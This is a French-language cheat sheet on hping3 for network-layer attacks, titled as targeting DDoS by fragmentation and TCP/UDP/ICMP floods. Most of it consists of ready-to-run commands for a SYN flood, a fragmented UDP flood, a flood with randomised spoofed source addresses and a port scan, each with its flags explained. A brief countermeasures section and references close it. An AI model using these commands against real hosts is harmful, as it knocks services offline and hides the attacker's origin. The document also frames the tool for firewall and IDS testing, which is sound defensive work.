# 6. `docs/Couche3_Reseau/cheat-couche3.md`

```markdown
# Couche 3 (Réseau) – Hping3

**Attaque ciblée** : DDoS par fragmentation, flood TCP/UDP/ICMP

---

## Sommaire

1. [Introduction](#introduction)
2. [Installation & Pré-requis](#installation--pré-requis)
3. [Commandes Clés](#commandes-clés)
4. [Exemples d’Attaques](#exemples-dattaques)
5. [Limitations & Contre-mesures](#limitations--contre-mesures)
6. [Références & Ressources](#références--ressources)

---

## Introduction

**Hping3** est un outil de manipulation de paquets TCP/IP. Il permet :
- Le test de firewall (envoi de paquets filtrés, fragmentation, etc.).
- Les attaques DoS (SYN flood, UDP flood).
- L’analyse de performance ou de latence (traceroute, ping avancé).

---

## Installation & Pré-requis

- Sur Debian/Ubuntu :
  ```bash
  sudo apt update
  sudo apt install hping3
  ```

---

## Commandes Clés

### 1) SYN Flood
```bash
hping3 -S -p 80 --flood -d 1000 192.168.1.1
```
- `-S` : flag SYN.  
- `--flood` : envoi en continu sans attendre réponse.  
- `-d 1000` : taille du paquet (payload).

### 2) UDP Flood avec fragmentation
```bash
hping3 --udp -p 53 --frag -d 2000 --flood 192.168.1.1
```
- `--udp` : mode UDP.  
- `--frag` : fragmentation.  
- `-d 2000` : 2000 octets de payload.

### 3) IP Spoofing (adresses sources aléatoires)
```bash
hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source 192.168.1.1
```
- `-c 10000` : nombre de paquets à envoyer.  
- `--rand-source` : génère des adresses IP sources aléatoires.

---

## Exemples d’Attaques

- **Découverte de ports** :  
  ```bash
  hping3 -S <IP_CIBLE> --scan 1-1000
  ```
- **Évasion de firewall** : en fragmentant les paquets ou en modifiant les flags.  
- **Simulation de trafic malveillant** pour tester un IDS/IPS.

---

## Limitations & Contre-mesures

- **Limites** :  
  - L’efficacité d’un flood dépend de la bande passante de l’attaquant.  
  - Les routeurs/firewalls modernes détectent souvent ce type de pattern.

- **Contre-mesures** :  
  - Déployer des solutions anti-DDoS (limitation de rate, filtrage de paquets).  
  - Surveiller les logs (syslog, IDS) pour repérer une charge inhabituelle.

---

## Références & Ressources

- [Site Officiel d’Hping3](http://www.hping.org/)  
- [GitHub hping](https://github.com/antirez/hping)  
- [RFC 791 (IP)](https://tools.ietf.org/html/rfc791)  
- [RFC 793 (TCP)](https://tools.ietf.org/html/rfc793)
